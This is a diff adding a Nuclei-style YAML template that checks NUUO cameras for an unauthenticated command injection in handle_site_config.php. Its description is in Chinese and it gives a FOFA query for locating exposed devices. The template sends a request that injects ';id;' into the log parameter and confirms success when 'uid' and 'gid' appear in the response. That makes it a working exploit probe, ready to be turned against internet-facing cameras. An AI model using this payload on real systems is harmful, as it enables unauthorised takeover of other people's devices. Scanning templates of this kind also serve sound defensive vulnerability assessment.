@@ -1,0 +1,29 @@
+id: nuuo-camera-handle_site_config-rce
+
+info:
+  name: "NUUO 摄像机 handle_site_config.php 未授权命令注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="www.nuuo.com/eHelpdesk.php"
+          该设备 handle_site_config.php 接口存在未经身份验证的命令注入缺陷，攻击者可通过构造恶意请求在目标系统上执行任意操作系统命令，最终实现对服务器的完全控制。
+  tags: NUUO
+
+http:
+- raw:
+  - |
+    GET /handle_site_config.php?log=;id; HTTP/1.1
+    Host: {{Hostname}}
+    Priority: u=0, i
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'uid'
+  - type: word
+    part: body
+    words:
+    - 'gid'
